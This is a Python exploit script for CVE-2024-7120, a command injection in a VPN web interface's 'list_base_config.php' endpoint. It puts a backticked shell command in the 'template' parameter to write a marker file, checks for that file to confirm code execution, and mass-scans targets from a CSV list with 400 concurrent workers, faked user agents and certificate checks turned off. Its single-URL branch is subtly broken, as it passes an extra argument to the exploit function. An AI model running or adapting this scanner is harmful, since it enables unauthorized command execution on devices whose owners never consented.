import argparse
import asyncio
import csv
import logging
import time
from datetime import datetime
from functools import wraps
from urllib.parse import urlunparse

import aiofiles
import httpx
from faker import Faker

FAKE = Faker()

HEADERS = {
    "User-Agent": FAKE.user_agent()
}

TIMEOUT = 12.0


def timeit(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        start_time = time.monotonic()
        result = await func(*args, **kwargs)
        end_time = time.monotonic()
        print(f"Execution time: {end_time - start_time:.2f} seconds")
        return result
    return wrapper


def setup_loggers(name: str, file_path: str):
    logger = logging.getLogger(name)
    logger.setLevel(logging.DEBUG)

    handler = logging.FileHandler(file_path)
    handler.setLevel(logging.DEBUG)

    formatter = logging.Formatter('%(levelname)s - %(message)s')
    handler.setFormatter(formatter)

    logger.addHandler(handler)

    return logger


LOGGER_NAME = "CVE-2024-7120"
LOGGER_FILE = f"CVE-2024-7120-{datetime.now().strftime('%M%S')}.log"
MESSAGE_LOGGER = setup_loggers(LOGGER_NAME, LOGGER_FILE)


def fix_base_url(host: str, protocol: str, ip: str, domain: str, port, **kwargs):
    if "://" in host:
        protocol_split = host.split("://", 1)
        scheme = protocol_split[0]
        netloc = protocol_split[1]
    else:
        scheme = protocol
        netloc = host
    
    if ":" in netloc:
        netloc_split = netloc.split(":", 1)
        base_host = netloc_split[0]
        port_from_host = netloc_split[1]
    else:
        base_host = netloc
        port_from_host = port

    if base_host and port_from_host:
        return urlunparse((scheme, f"{base_host}:{port_from_host}", '', '', '', ''))
    
    final_netloc = f"{domain if domain else ip}:{port_from_host}"
    return urlunparse((scheme, final_netloc, '', '', '', ''))


async def async_read_csv(file_path, encoding="utf-8-sig"):
    async with aiofiles.open(file_path, mode='r', encoding=encoding) as file:
        header = next(csv.reader([await file.readline()]))
        async for line in file:
            row = next(csv.reader([line]))
            if len(row) != len(header):
                print(f"Error: Invalid row in CSV file: {row}")
                break
            yield dict(zip(header, row, strict=True))


def handle_exceptions(func):
    async def wrapper(*args, **kwargs):
        try:
            await func(*args, **kwargs)
        except httpx.RequestError as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] RequestError: {e}")
        except httpx.TimeoutException as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] Request timed out")
        except httpx.HTTPStatusError as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] HTTPStatusError: {e.response.status_code}")
        except Exception as e:
            MESSAGE_LOGGER.error(f"[*] Unhandled Exception: {e}")
        return None
    return wrapper


@handle_exceptions
async def exploit(target: dict | str):
    base_url = None
    if isinstance(target, str):
        base_url = target
    else:
        base_url = fix_base_url(**target)
    if base_url is None:
        raise ValueError("Invalid target")
    
    verify_code = "zAlcxCGpoSM0eFSPSaVuCWA3WqST9d56"
    exec_cmd = f"echo -e {verify_code} > /www/tmp/info.html"
    web_path = "/vpn/list_base_config.php"
    params = {
        "type": "mod",
        "parts": "base_config",
        "template": f"`{exec_cmd}`"
    }

    async with httpx.AsyncClient(
        headers=HEADERS,
        verify=False,  # noqa: S501
        follow_redirects=True,
        max_redirects=1,
        timeout=TIMEOUT
    ) as client:
        response = await client.get(f"{base_url}{web_path}", params=params)
        if response.status_code == 200:
            response = await client.get(f"{base_url}/www/tmp/info.html")
            if response.status_code == 200 and verify_code in response.text:
                MESSAGE_LOGGER.info(f"[+] [{base_url}]")
            else:
                MESSAGE_LOGGER.info(f"[-] [{base_url}] not find verify code")
        else:
            MESSAGE_LOGGER.info(f"[-] [{base_url}]")


async def request_task(queue: asyncio.Queue):
    while True:
        target = await queue.get()
        if target:
            await exploit(target)
        queue.task_done()


async def task_manager(csv_file, task_num=400, queue_size=10000):
    queue = asyncio.Queue(queue_size)

    tasks = [asyncio.create_task(request_task(queue)) for _ in range(task_num)]

    async for target in async_read_csv(csv_file):
        await queue.put(target)
    
    await queue.join()
    await asyncio.sleep(TIMEOUT * 1.5)
    
    for task in tasks:
        task.cancel()

    await asyncio.gather(*tasks, return_exceptions=True)


@timeit
async def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="URL of the target")
    group.add_argument("-f", "--file", help="Path to the target file")
    args = parser.parse_args()

    match args:
        case _ if args.file:
            await task_manager(args.file)
        case _ if args.url:
            async with httpx.AsyncClient(
                headers=HEADERS,
                verify=False, # noqa: S501
                follow_redirects=True,
                max_redirects=1,
                timeout=TIMEOUT
            ) as client:
                await exploit(client, args.url)


if __name__ == "__main__":
    asyncio.run(main())